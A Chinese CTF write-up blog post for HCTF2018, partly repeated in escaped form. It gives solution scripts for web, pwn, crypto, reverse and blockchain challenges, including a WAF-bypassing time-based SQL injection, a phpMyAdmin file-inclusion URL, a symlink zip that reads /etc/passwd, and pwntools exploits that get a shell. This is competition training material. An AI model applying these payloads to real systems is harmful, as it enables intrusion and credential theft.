remote('150.109.119.46',6775)\nprint p.recv()\nprint p.recv()\np.sendline('y')\nprint p.recv()\np.sendline('8RMQq9PuDRurd91OVhADpDDK30eqjAqz')\nres = ''\nfor i in range(8):\n    res = res + p.recv()\nres = res + p.recvuntil(']')\np.sendline(\"137 212 218 251\")\nres = ''\nfor i in range(8):\n    res = res + p.recv()\nres = res + p.recvuntil(']')\np.sendline(\"57 79 80 210\")\nres = ''\nfor i in range(8):\n    res = res + p.recv()\nres = res + p.recvuntil(']')\np.sendline(\"89 128 170 130\")\nres = ''\nfor i in range(8):\n    res = res + p.recv()\nres = res + p.recvuntil(']')\np.sendline(\"28 117 198 213\")\nres = ''\nfor i in range(8):\n    res = res + p.recv()\nres = res + p.recvuntil(']')\np.sendline(\"95 111 169 222\")\nres = ''\nfor i in range(8):\n    res = res + p.recv()\nres = res + p.recvuntil(']')\np.sendline(\"2 75 210 213\")\nres = ''\nfor i in range(8):\n    res = res + p.recv()\nres = res + p.recvuntil(']')\np.sendline(\"38 162 175 180\")\n\nres = ''\nfor i in range(8):\n    res = res + p.recv()\nres = res + p.recvuntil(']')\nres = res[1:-1]\n\nnumlist = []\nressplit = res.split(',')\ntestlist = []\nfor i in range(len(ressplit)):\n    numlist.append(float(ressplit[i])/7.0)\n    if float(ressplit[i])/7.0 > 3.0:\n        testlist.append((i,float(ressplit[i])/7.0))\n\nprint testlist\n\nmylist = []\nfor i in range(256):\n    temp = []\n    x = np.linspace(0,1,1500)\n    y = np.sin(2*np.pi*x*i)\n    mylist.append(list(y))\n    if show(list(y),testlist) :\n        print i\n'''\ntemp = [88,89,128,129,130,169,170]\nprint testlist[2][1]\nfor a in temp:\n    for b in temp:\n        for c in temp:\n            for d in temp:\n                if mylist[a][testlist[2][0]] + mylist[b][testlist[2][0]] + mylist[c][testlist[2][0]] + mylist[d][testlist[2][0]] = testlist[2][1]:\n                    print a,b,c,d\n'''\np.interactive()\n\n```\n因为懒得把代码复制粘贴8遍，所以我是得到每轮结果以后把它保存下来，重开一个直接发过去的，所以最后脚本里只保留了最后一轮的过程，前面的都简化成了发结果。。。\n\n\n### Guess My Key\n这题听说是机器学习一开始没敢做，后来想想好像没那么难，题目思路是96bit的msg和96bit的key，可以任意提交msg和key来得到加密结果，或者提交msg获得用预设的key加密的结果，然后去猜题目预设的key。这个题我的思路是把raw_cipher当作一个空间向量，对每一bit的key去计算它是0和1时与key所获得的raw_cipher之间的距离来分析这1bit为0或1的概率，不断拟合使我计算所得的key与预设的key得到的空间向量不断接近，从而获得预设的key，代码如下：\n```python\nfrom urllib import *\nimport json\nurl = 'http://150.109.62.46:13577/enc?'\n\norilist = []\norilist.append([0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 1, 1, 0, 0, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 1, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 1, 1, 0, 1, 1, 1, 0, 0, 1, 0, 0, 0, 1, 1, 1])#0.00299699357119\norilist.append([0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 1, 0, 1, 1, 1, 1, 0, 0, 1, 0, 0, 0, 0, 1, 0, 1, 1, 0, 1, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 1])#0.00170157012619\norilist.append([0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 1, 1, 0, 0, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 1, 1, 0, 0, 1, 1, 0, 1, 1, 1, 1, 0, 0, 1, 0, 0, 0, 0, 1, 0, 1, 1, 0, 1, 1, 1, 0, 1, 1, 0, 0, 0, 0, 1, 1])#0.00135932497845\norilist.append([0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 1, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 1, 1, 0, 1, 1, 1, 0, 0, 1, 0, 0, 0, 1, 1, 1])#0.000528410497059\n\n\nmsg = '1,'*95+'1'\nf = urlopen(url + 'msg=' + msg)\nmylist = json.loads(f.read())\noricipher = mylist['raw_cipher'].split(',')\n\ndef list2str(mylist):\n\tresult = ''\n\tfor i in mylist:\n\t\tif i == 1:\n\t\t\tresult += '1,'\n\t\telse:\n\t\t\tresult += '0,'\n\treturn result[:-1]\n\ndef getdst(tempcipher,oricipher):\n\tresult = 0.0\n\tfor i in range(len(oricipher)):\n\t\tresult += abs(pow(float(oricipher[i])-float(tempcipher[i]),2))\n\treturn result\n\nmyresult1 = []\nmyresult2 = []\n\nfor i in range(96):\n\tsumzerodst = 0.0\n\tsumonedst = 0.0\n\tmindst = 1.0\n\tminchr = -1\n\tfor j in range(len(orilist)):\n\t\tkey = orilist[j][:i] + [0] + orilist[j][i+1:]\n\t\tf = urlopen(url + 'msg=' + msg + '&' + 'key=' + list2str(key))\n\t\tmylist = json.loads(f.read())\n\t\ttempcipher = mylist['raw_cipher'].split(',')\n\t\tdst = getdst(tempcipher,oricipher)\n\t\tif dst < mindst:\n\t\t\tmindst = dst\n\t\t\tminchr = 0\n\t\tsumzerodst += dst\n\t\tkey = orilist[j][:i] + [1] + orilist[j][i+1:]\n\t\tf = urlopen(url + 'msg=' + msg + '&' + 'key=' + list2str(key))\n\t\tmylist = json.loads(f.read())\n\t\ttempcipher = mylist['raw_cipher'].split(',')\n\t\tdst = getdst(tempcipher,oricipher)\n\t\tif dst < mindst:\n\t\t\tmindst = dst\n\t\t\tminchr = 1\n\t\tsumonedst += dst\n\tmyresult1.append(minchr)\n\tif sumonedst > sumzerodst :\n\t\tmyresult2.append(0)\n\telse :\n\t\tmyresult2.append(1)\nprint \"======myresult======\"\nprint myresult1\nprint myresult2\nprint \"======myresult======\"\n\nf = urlopen(url + 'msg=' + msg + '&' + 'key=' + list2str(myresult1))\nmylist = json.loads(f.read())\nmycipher1 = mylist['raw_cipher'].split(',')\n\nf = urlopen(url + 'msg=' + msg + '&' + 'key=' + list2str(myresult2))\nmylist = json.loads(f.read())\nmycipher2 = mylist['raw_cipher'].split(',')\n\nprint getdst(mycipher1,oricipher)\nprint getdst(mycipher2,oricipher)\n\nif mycipher1 == oricipher:\n\tprint \"mycipher1\"\nif mycipher2 == oricipher:\n\tprint \"mycipher2\"\n```\n最开始我预设的orilist二维数组是[[1,0]*48,[0,1]*48,[1,1,0,0]*24,[0,0,1,1]*24],之后把距离结果空间向量更近的myresult作为新的key替换掉其中原本的key，一步一步缩小dst从而获得key的\n\n### easy dump\n\nVolatility + GIMP，可以查看内存里的内容，内存中有很多扫雷和写字板：i am boring真是服气2333\n在文件大概3/4的位置，可以看到flag在画图里\n```\nhctf{big_brother_is_watching_you}\n```\n\n### difficult programming language\n\n给了键盘流量包，可以使用一航师傅的脚本直接得到键盘输入的内容。【\\<GA\\>是～\\`】\n```\nD'`;M?!\\mZ4j8hgSvt2bN);^]+7jiE3Ve0A@Q=|;)sxwYXtsl2pongOe+LKa'e^]\\a`_X|V[Tx;\"VONSRQJn1MFKJCBfFE>&<`@9!=<5Y9y7654-,P0/o-,%I)ih&%$#z@xw|{ts9wvXWm3~\n```\n题目名称叫difficult programming language，google了一下什么破语言长这个样子。。\n`Malbolge.`\n网上找到运行工具 https://zb3.me/malbolge-tools/#interpreter\n发现这个字符串里还有输错的一个字符。\n经另一个工具的调试，可以得知是一个:写成了\"号，解得flag\n```\nhctf{m4lb0lGe}\n```\n\n### Questionnaire\n\n谢谢杭电的师傅带来的题目们！\n\n## crypto\n\n### xor?rsa\n\n这题目去网上找了一个Coppersmith’s Short Pad Attack的脚本解就完事了(代码是sage的)。做的时候有时候会出bug我猜是因为程序只考虑了m1 < m2的情况\n```python\ndef short_pad_attack(c1, c2, e, n):\n    PRxy.<x,y> = PolynomialRing(Zmod(n))\n    PRx.<xn> = PolynomialRing(Zmod(n))\n    PRZZ.<xz,yz> = PolynomialRing(Zmod(n))\n\n    g1 = x^e - c1\n    g2 = (x+y)^e - c2\n\n    q1 = g1.change_ring(PRZZ)\n    q2 = g2.change_ring(PRZZ)\n\n    h = q2.resultant(q1)\n    h = h.univariate_polynomial()\n    h = h.change_ring(PRx).subs(y=xn)\n    h = h.monic()\n\n    kbits = n.nbits()//(2*e*e)\n    diff = h.small_roots(X=2^kbits, beta=0.5)[0]  # find root < 2^kbits with factor >= n^0.5\n\n    return diff\n\ndef related_message_attack(c1, c2, diff, e, n):\n    PRx.<x> = PolynomialRing(Zmod(n))\n    g1 = x^e - c1\n    g2 = (x+diff)^e - c2\n\n    def gcd(g1, g2):\n        while g2:\n            g1, g2 = g2, g1 % g2\n        return g1.monic()\n\n    return -gcd(g1, g2)[0]\n\n\nif __name__ == '__main__':\n    n= 27624787021478794432014046099044118472227462806689571877169321162341080400196594346396848700712193861439412465401252070834347447700123908992634057384897412386580543011772079685187452484482547314927927429951393092826148514141421284117787379461959985518410275689835704614842539327338694334290636840780333631465334614621493439746492265763855548204271205728089432042119353912134654280030097883942195750158943707581611175683875993347872617178472015419336030838097558714715441536192198290146161340547436590517299418585354071449344756659404775888056026765078595754225196944721648716610489001136659404706431278525745515104917\n    c1= 13776430024099427642531911099839128926564176154051949185623735493234122290060192171769692779077048350629609066059365476450358845203910684337231957918278447357520403549804467122983129527704870697355281794028641080624088689157548661997693776511974828120568864171878093764082280753662161625828078814197217819685649535298124739243813838247280440444870641299263032971398100048924255763139678843914805922076507098230791386720957494918572285270985306870181291182419426387424133256438320963476729846690659232164905237954666457813107525668584308246667410713493861547967072360028087639069471098558962062807871564380753429263871\n    c2= 657231109479430507699610101563647841801217640396116098068091897995892991211353444343972272978841494609004887673387698097902809034155415900362766044097098144261124986944336934366572328336651114328263543752730621658631527529933155522273669604895074397446129985885649878307733042032148247389310416198437240727964021932669979819481020837218701471923646557509580811764880281874944153918428434725834087434372596746861333346978776952856870040789444689376922826142208442257560964199238714914125845958146653319252684895614435672435449705706009355823637834574529488498832642357882290037365904913250435342395978044581644541358\n    e = 5\n\n    diff = short_pad_attack(c1, c2, e, n)\n    print \"difference of two messages is %d\" % diff\n\n    m1 = related_message_attack(c1, c2, diff, e, n)\n    m2 = m1 + diff\n    print \"------\"\n    print m1\n    print \"------\"\n    print pow(m1,e,n)\n    print c1\n    print \"------\"\n    print m2\n    print \"------\"\n    print pow(m2,e,n)\n    print c2\n```\n\n### xor game \n\n[参考](https://www.anquanke.com/post/id/161171#h2-0)  \n原理是汉明码，脚本如下:\n```python\nimport base64\nimport string\n\n\ndef bxor(a, b):     # xor two byte strings of different lengths\n    if len(a) > len(b):\n        return bytes([x ^ y for x, y in zip(a[:len(b)], b)])\n    else:\n        return bytes([x ^ y for x, y in zip(a, b[:len(a)])])\n\n\ndef hamming_distance(b1, b2):\n    differing_bits = 0\n    for byte in bxor(b1, b2):\n        differing_bits += bin(byte).count(\"1\")\n    return differing_bits\n\n\ndef break_single_key_xor(text):\n    key = 0\n    possible_space = 0\n    max_possible = 0\n    letters = string.ascii_letters.encode('ascii')\n    for a in range(0, len(text)):\n        maxpossible = 0\n        for b in range(0, len(text)):\n            if(a == b):\n                continue\n            c = text[a] ^ text[b]\n            if c not in letters and c != 0:\n                continue\n            maxpossible += 1\n        if maxpossible > max_possible:\n            max_possible = maxpossible\n            possible_space = a\n    key = text[possible_space] ^ 0x20\n    return chr(key)\n\n\ntext = ''\nwith open('cipher.txt', 'r') as f:\n    for line in f:\n        text += line\nb = base64.b64decode(text)\n\n\nnormalized_distances = []\n\nfor KEYSIZE in range(2, 40):\n    b1 = b[: KEYSIZE]\n    b2 = b[KEYSIZE: KEYSIZE * 2]\n    b3 = b[KEYSIZE * 2: KEYSIZE * 3]\n    b4 = b[KEYSIZE * 3: KEYSIZE * 4]\n    b5 = b[KEYSIZE * 4: KEYSIZE * 5]\n    b6 = b[KEYSIZE * 5: KEYSIZE * 6]\n\n    normalized_distance = float(\n        hamming_distance(b1, b2) +\n        hamming_distance(b2, b3) +\n        hamming_distance(b3, b4) +\n        hamming_distance(b4, b5) +\n        hamming_distance(b5, b6)\n    ) / (KEYSIZE * 5)\n    normalized_distances.append(\n        (KEYSIZE, normalized_distance)\n    )\nnormalized_distances = sorted(normalized_distances, key=lambda x: x[1])\n\n\nfor KEYSIZE, _ in normalized_distances[:5]:\n    block_bytes = [[] for _ in range(KEYSIZE)]\n    for i, byte in enumerate(b):\n        block_bytes[i % KEYSIZE].append(byte)\n    keys = ''\n    try:\n        for bbytes in block_bytes:\n            keys += break_single_key_xor(bbytes)\n        key = bytearray(keys * len(b), \"utf-8\")\n        plaintext = bxor(b, key)\n        print(\"keysize:\", KEYSIZE)\n        print(\"key is:\", keys, \"n\")\n        s = bytes.decode(plaintext)\n        print(s)\n    except Exception:\n        continue\n\n```\n最后的结果:\nflag:```hctf{xor_is_interesting!@#}```\n\n## blockchain\n\n### bet2loss\n\n一血！是个dice2win早期版本+erc20的题目，开奖函数可以重放，但是没看出来通过哪一步的重放能获得token。\n每个账号会空投1000 token，只需要一万个账号就可以拿到flag。遂发动薅羊毛攻击。还是很慢，希望下次换个链哈哈哈。\n\n```\npragma solidity ^0.4.20;\ncontract Attack_7878678 {\n//    address[] private son_list;\n\n    function Attack_7878678() payable {}\n\n    function attack_starta(uint256 reveal_num) public {\n        for(int i=0;i<=50;i++){\n            son = new Son(reveal_num);\n        }\n    }\n\n    function () payable {\n    }\n}\n\ncontract Son_7878678 {\n\n    function Son_7878678(uint256 reveal_num) payable {\n        address game = 0x006b9bc418e43e92cf8d380c56b8d4be41fda319;\n        game.call(bytes4(keccak256(\"settleBet(uint256)\")),reveal_num);\n        game.call(bytes4(keccak256(\"transfer(address,uint256)\")),0x5FA2c80DB001f970cFDd388143b887091Bf85e77,950);\n    }\n    function () payable{\n    }\n}\n```\n\n```\nhctf{Ohhhh_r3p1ay_a77ack_f0r_c0n7r4ct}\n```\n\n### ez2win\n\n```\n_transfer(address from, address to, uint256 amount);\n```\n未设置权限，可以随便转。开源了以后很简单就能拿到flag。\n```\nhctf{0hhhh_m4k3_5ur3_y0ur_acc35s_c0n7r01}\n```\n","source":"_posts/writeup-hctf2018.md","raw":"---\ntitle: 【writeup】hctf2018\ndate: 2018-11-21 14:14:30\ntags:\n- ctf\n- writeup\n- 天枢\n---\n\n来自杭电师傅的HCTF，比赛很有趣！本次比赛线上赛我们好像是第四还是第五，线下赛是Henryzhao，姚老板和禹越去的，拿了线下赛第一吼吼~\n\n<!-- more -->\n\n## web\n\n### warmup\n\nphpmyadmin4.8.1的文件包含漏洞，截取和转义的问题。\n\n```\nhttp://warmup.2018.hctf.io/index.php?file=hint.php%253f/../../../../ffffllllaaaagggg\n```\n\n### kzone\n\n扫描目录发现/www.zip有源码，下载之，开始审计\n同时搜到了题目源码的出处，来自一个钓鱼网站模板；也搜到了一篇针对这个模板进行渗透的文章 https://bbs.ichunqiu.com/article-1518-1.html\n\n/include/member.php存在注入，但是需要绕过safe.php的waf\n在member.php中发现了json_decode\n可以解析\\u0020这样的unicode编码\n所以所有被waf检测到的字符全部使用此编码绕过\n首先注出了后台账号密码 尝试登录但后台没有东西 于是猜测flag在数据库中 继续用脚本注入得到flag\n注入的时候还碰到了大小写不敏感的问题 使用binary可以解决\n```\nimport requests\nimport time\nurl = \"http://kzone.2018.hctf.io/admin/login.php\"\nflag = ''\ndic = \"0123456789abcdefghijklmnopqrstuvwxyz{}_ABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&()*+|,-./:;<=>?@\"\nfor x in range(1,50):\n    for i in dic:\n        startTime = time.time()\n        #poc = \"'\\u006fr\\u0020su\\u0062str(passwo\\u0072d,{0},1)\\u003d'{1}'\\u0020and\\u0020sl\\u0065ep(6)\\u0023\".format(x,chr(i))\n        #admin BE933CBA048A9727A2D2E9E08F5ED046\n        #poc = \"'\\u006fr\\u0020su\\u0062str((select\\u0020binary\\u0020table_name\\u0020from\\u0020inf\\u006frmation_schema.tables\\u0020where\\u0020TABLE_SCHEMA\\u003ddatabase()\\u0020limit\\u00200,1),{0},1)\\u003d'{1}'\\u0020and\\u0020sl\\u0065ep(6)\\u0023\".format(x,i)\n        #F1444g\n        #poc = \"'\\u006fr\\u0020su\\u0062str((select\\u0020binary\\u0020column_name\\u0020from\\u0020inf\\u006frmation_schema.columns\\u0020where\\u0020TABLE_SCHEMA\\u003ddatabase()\\u0020limit\\u00200,1),{0},1)\\u003d'{1}'\\u0020and\\u0020sl\\u0065ep(6)\\u0023\".format(x,i)\n        #F1a9\n        poc = \"'\\u006fr\\u0020su\\u0062str((select\\u0020binary\\u0020F1a9\\u0020from\\u0020F1444g\\u0020limit\\u00200,1),{0},1)\\u003d'{1}'\\u0020and\\u0020sl\\u0065ep(6)\\u0023\".format(x,i)\n        headers = {\"Cookie\":'islogin=1; login_data={\\\"admin_user\\\":\\\"'+poc+'\\\"}'}\n        r = requests.get(url,headers=headers)\n        if time.time() - startTime > 5:\n            flag += i\n            print flag\n            break\n```\n\n### admin\n这简直是我做ctf以来最神奇的一次经历\n先是在fuzz过程中莫名其妙的拿到了flag \n这一点其实想看看出题大佬怎么说的，感觉是后端数据库刷新的时候验证用户会出现问题。因为后来又复现成功了一次，具体操作是：在整点的时候注册admin账户提示已存在->再注册自己的账户提示注册成功后直接弹出flag，如下图...\n\n![](http://cur5s-1.oss-cn-beijing.aliyuncs.com/18-11-12/75374228.jpg)\n\n根据flag的内容知道考点是unicode cheat...队友研究了一波\n注册 ᴬdmin，登录后修改密码，数据库会将真实admin的密码修改掉，然后再登录admin就可以了。\n而后队友下午再次尝试复现的时候发现题目竟然在修改密码的页面给了源码...\n\n然后我们就成了 获得flag->根据flag获知解题方法->发现题目竟然给出了源码\nctf史上第一支倒着做题的队伍（手动捂脸\n坐等官方大佬的wp解释一下非预期解的问题，估计有不少做出这道题的队伍是先拿到了flag\n\n\n### hideandseek\n\n这题还是有意思，做起来每一步都很有道理，我们队好几个人一起做出来这个题。\n\n1. 登录进去后，提示上传一个zip文件，发现他会cat这个文件，想到以前见过的上传硬连接。\n```\nln -s /etc/passwd ./templink\nzip --symlink -r lala.zip ./templink\n```\n上传即可\n2. 信息收集\n权限很低，很多都读不了，但还是可以看看/proc下面的各种内容。\n- /proc/self/environ，找到web服务目录。\n- /app/hard_t0_guess_n9f5a95b5ku9fg/hard_t0_guess_also_df45v48ytj9_main.py 是运行的文件\n- /app/hard_t0_guess_n9f5a95b5ku9fg/flag.py 不能直接读，尴尬\n- /app/hard_t0_guess_n9f5a95b5ku9fg/templates/index.html 读模板\n3. cookie伪造\n看到key是随机数生成的，种子是uuid，uuid.getnode()是mac地址，可以\n```\ncat /sys/class/net/eth0/address\n```\n伪造一个username=admin的cookie就好啦。\n\n### game\n\n这题目也很有趣，可以随意注册，登陆以后可以看到所有注册了的人的列表。看其他人注册了好多，思考为什么这么做。各种注入都试了，没有注入点。\n看到了order=score，试着order=id，name都可以，又试着order=password，发现也行，震惊！\n```\nimport requests\nimport string\nimport os, random\n\nguess_list = string.printable\n\nold_password = 'dsA8&&!@#$%^&D1NgY1as3DjA'\n\ndef encode(length, op):\n    a = ''.join(random.sample(string.ascii_letters + string.digits, length/2))\n    a += (op+''.join(random.sample(string.ascii_letters + string.digits, 2))).encode('base64')[:-1]\n    a += ''.join(random.sample(string.ascii_letters + string.digits, length/2))\n    return a\n    \n\nfor op in guess_list:\n    data = {\n\t    'username': 'TuTuXiXiHHH'+ encode(len(old_password),op),\n\t    'password': old_password + op,\n\t    'sex':'1',\n\t    'submit':'submit',\n    }\n\n    requests.post(\"http://game.2018.hctf.io/web2/action.php?action=reg\",data = data)\n    print op, data\n```\n注册好多号不断的逼近admin的密码，登录后访问flag.php【user.php里有提示】，拿到flag。\n\n\n## pwn\n\n### the_end\n程序本身的功能为5次任意地址（用户输入）的1字节写随后调用exit()函数，且提供了sleep@libc的地址。通过单步跟踪exit()函数可以发现，程序在_dl_fini()函数中会\n```asm\ncall   QWORD PTR [rip+0x216414]        # 0x7ffff7ffdf48 <_rtld_global+3848>\n```\n因此，只要将0x7ffff7ffdf48 <_rtld_global+3848>处修改为one_gadget的地址即可拿到shell，刚好需要修改5个字节。\n由于程序关闭了stdout，拿到shell后，使用\n```bash\nexec /bin/sh 1>&0\n```\n执行sh并重定向标准输出流到标准输入流，即可与shell正常交互。\n```python\n# coding=utf-8\nfrom pwn import *\n\ndef pwn():\n    BIN_PATH = './the_end'\n    DEBUG = 1\n    local = 1\n    if DEBUG == 1:\n        if local == 1:\n            p = process(BIN_PATH)\n        else:\n            p = process(BIN_PATH, env={'LD_PRELOAD': './libc.so.6'})\n        elf = ELF(BIN_PATH)\n        context.log_level = 'debug'\n        context.terminal = ['tmux', 'split', '-h']\n        if context.arch == 'amd64':\n            if local == 1:\n                libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')\n            else:\n                libc = ELF('./libc.so.6')\n        else:\n            libc = ELF('/lib/i386-linux-gnu/libc.so.6')\n    else:\n        p = remote('150.109.44.250', 20002)\n        p.recvuntil('Input your token:')\n        p.sendline('8RMQq9PuDRurd91OVhADpDDK30eqjAqz')\n        elf = ELF(BIN_PATH)\n        libc = ELF('./libc.so.6')\n        context.log_level = 'debug'\n\n    if DEBUG == 1:\n        gdb.attach(p, gdbscript='b *0x0000555555554964')\n\n    p.recvuntil('here is a gift ')\n    recv = p.recvuntil(',', drop=True)\n    libc.address = int(recv, 16) - libc.symbols['sleep']\n    print hex(libc.address)\n    one_gadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147]\n    p.recvuntil('luck ;)\\n')\n    p.send(p64(libc.address + (0x7ffff7ffdf48 - 0x00007ffff7a0d000)))\n    p.send(p64(libc.address + one_gadget[2])[0])\n    p.send(p64(libc.address + (0x7ffff7ffdf48 - 0x00007ffff7a0d000) + 1))\n    p.send(p64(libc.address + one_gadget[2])[1])\n    p.send(p64(libc.address + (0x7ffff7ffdf48 - 0x00007ffff7a0d000) + 2))\n    p.send(p64(libc.address + one_gadget[2])[2])\n    p.send(p64(libc.address + (0x7ffff7ffdf48 - 0x00007ffff7a0d000) + 3))\n    p.send(p64(libc.address + one_gadget[2])[3])\n    p.send(p64(libc.address + (0x7ffff7ffdf48 - 0x00007ffff7a0d000) + 4))\n    p.send(p64(libc.address + one_gadget[2])[4])\n    # exec /bin/sh 1>&0\n    p.interactive()\n    p.close()\n\n\nif __name__ == '__main__':\n    pwn()\n\n```\nflag:```hctf{999402245e53bc5f0154c2a931bdc52ca3f6ee34e017f19c09a70e93c8fd4ffa}```\n\n### babyprintf_ver2\n\n该程序通过read向bss上的全局变量输入数据，其后是stdout指针，可以进行覆盖篡改。由于知道bss的地址，首先将stdout指针的值修改为bss的地址，并在bss上布置虚假的stdout的FILE结构体，vtable地址由于程序本身带有检测，会自动填入。通过设置FILE结构体中的缓冲区指针，泄漏libc地址和修改__malloc_hook的值为one_gadget。最后通过触发printf_chk的报错使得程序调用malloc函数进而getshell。\n```python\n# coding=utf-8\nfrom pwn import *\n\ndef pwn():\n    BIN_PATH = './babyprintf_ver2'\n    DEBUG = 0\n    context.arch = 'amd64'\n    if DEBUG == 1:\n        p = process(BIN_PATH)\n        elf = ELF(BIN_PATH)\n        context.log_level = 'debug'\n        context.terminal = ['tmux', 'split', '-h']\n        if context.arch == 'amd64':\n            libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')\n        else:\n            libc = ELF('/lib/i386-linux-gnu/libc.so.6')\n    else:\n        p = remote('150.109.44.250', 20005)\n        elf = ELF(BIN_PATH)\n        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')\n        p.recvuntil('Input your token:')\n        p.sendline('8RMQq9PuDRurd91OVhADpDDK30eqjAqz')\n        context.log_level = 'debug'\n\n\n    p.recvuntil('buffer location to')\n    recv = p.recvuntil('\\n', drop=True)\n    bss_address = int(recv, 16)\n    p.recvuntil('Have fun!\\n')\n    payload = 'a' * 16 + p64(bss_address + 0x20) + p64(0) + p64(0x00000000fbad2884) + p64(bss_address + 0xf8) * 3\n    payload += p64(bss_address + 0xf8) + p64(bss_address + 0x100) + p64(bss_address + 0x11d)\n    payload += p64(bss_address + 0xf8) + p64(bss_address + 0x11d) + p64(0) * 5 + p64(1) + p64(0xffffffffffffffff) + p64(0x0000000000000000)\n    payload += p64(bss_address + 0x130) + p64(0xffffffffffffffff) + p64(0) * 5 + p64(0x00000000ffffffff)\n\n    p.sendline(payload)\n    p.recvuntil('permitted!\\n')\n    p.sendline('a' * 8)\n    recv = p.recv(8)\n    libc.address = u64(recv) - (0x7ffff7dcc2a0 - 0x7ffff79e4000)\n    print hex(libc.address)\n\n    payload = 'a' * 16 + p64(bss_address + 0x20) + p64(0) + p64(0x00000000fbad2884)\n    payload += p64(bss_address + 0x200) * 7\n    payload += p64(bss_address + 0x200) + p64(0) * 5 + p64(1) + p64(0xffffffffffffffff) + p64(0x0000000000000000)\n    payload += p64(bss_address + 0x130) + p64(0xffffffffffffffff) + p64(0) * 5 + p64(0x00000000ffffffff)\n\n    p.sendline(payload)\n\n    malloc_hook_addr = libc.symbols['__malloc_hook']\n\n    payload = 'a' * 16 + p64(bss_address + 0x20) + p64(0) + p64(0x00000000fbad2884)\n    payload += p64(bss_address + 0x200) * 6\n    payload += p64(malloc_hook_addr) + p64(malloc_hook_addr + 0x8 + 4) + p64(0) * 5 + p64(1) + p64(0xffffffffffffffff) + p64(0x0000000000000000)\n    payload += p64(bss_address + 0x130) + p64(0xffffffffffffffff) + p64(0) * 5 + p64(0x00000000ffffffff)\n    p.sendline(payload)\n\n    p.sendline(p64(libc.address + 0x10a38c)) # one_gadget\n\n    payload = 'a' * 16 + p64(bss_address + 0x20) + p64(0) + p64(0x00000000fbad2884)\n    payload += p64(bss_address + 0x200) * 7\n    payload += p64(bss_address + 0x200) + p64(0) * 5 + p64(1) + p64(0xffffffffffffffff) + p64(0x0000000000000000)\n    payload += p64(bss_address + 0x130) + p64(0xffffffffffffffff) + p64(0) * 5 + p64(0x00000000ffffffff)\n    p.sendline(payload)\n    sleep(0.5)\n    p.sendline('%49$p')\n    \n    p.interactive()\n    p.close()\n\n\nif __name__ == '__main__':\n    pwn()\n\n```\nflag:```hctf{72717218d270a992e1415bb825366e79d254ec232022b5fc45297ef7ae5c7ea6}```\n## re\n\n### LuckStar\n这题有不少反调试.\n首先在TlsCallback_0里获取了一堆反调试常用函数地址:\n![](http://ww1.sinaimg.cn/large/006ZzYxZly1fx4ylwxkhkj31iw0abjru.jpg)\n排查几款调试器，并解混淆的main函数\n![](http://ww1.sinaimg.cn/large/006ZzYxZly1fx4ymtx7s7j315e0n4js0.jpg)\n在之前获取的CheckRemoteDebuggerPresent函数下断点\n![](http://ww1.sinaimg.cn/large/006ZzYxZly1fx4yn2l65cj30nw06h3yw.jpg)\n发现在调用main之前被调用，用于重设srand的种子,应为hctf。\n接着进入main函数：\n![](http://ww1.sinaimg.cn/large/006ZzYxZly1fx4yn9qzczj30t10lp76f.jpg)\nmain函数里，my_base64函数被混淆，只用用seed=hctf才能正确还原。\nmy_base64如下：\n![](http://ww1.sinaimg.cn/large/006ZzYxZly1fx4ynimy3ij30th0f9q3k.jpg)\n在my_base64里面对输入的字符进行变异的base64处理，不过把大小写互换，然后把加密的结果做一段xor处理。return后与main函数里预存储的v17做比较，相同则得到flag。\n由于仅作xor处理，这里我动调时把预存储的v17数据放在xor处理执行，得到base64(flag),\n![](http://ww1.sinaimg.cn/large/006ZzYxZly1fx4ypprkjaj30gr022t99.jpg)\n做大小写转换后，解base64得flag:\n![](http://ww1.sinaimg.cn/large/006ZzYxZly1fx4ypyyscwj305x00xwec.jpg)\n\n### Seven\n\n驱动程序逆向，程序关键逻辑很少，需要我们走一个类似7字的迷宫，迷宫图直接就能看到，四个十六进制码0x11,0x1F,0x1E,0x20分别控制人物的上下左右移动，o代表当前位置，\\*代表不可行位置，.代表可行位置。整个程序找不到输入，但是能发现一个12字节的结构体，查阅资料发现是KEYBOARD_INPUT_DATA结构，第二个USHORT成员MAKECODE是键盘的扫描码，搜索扫描码，得到四个十六进制码分别对应wsad。\nflag:```hctf{ddddddddddddddssaasasasasasasasasas}```\n\n### PolishDuck\n\nBadusb的题目，同种类型的题目出现了很多次，印象里最先看到是在pwnhub-血月归来一题，后来是HITB-hex一题，到SUCTF2018的SecretGarden，XCTF2018Final，然后是HCTF2018的PolishDuck，做法和pwnhub上面的一模一样，都是打开notepad.exe，然后输入一串计算数字。我们只要整理出数字串，计算出结果，hex再hex解码即可得到flag。\nflag:```hctf{P0l1sh_Duck_Tast3s_D3l1ci0us_D0_U_Th1nk?}```\n\n## misc\n\n### freq 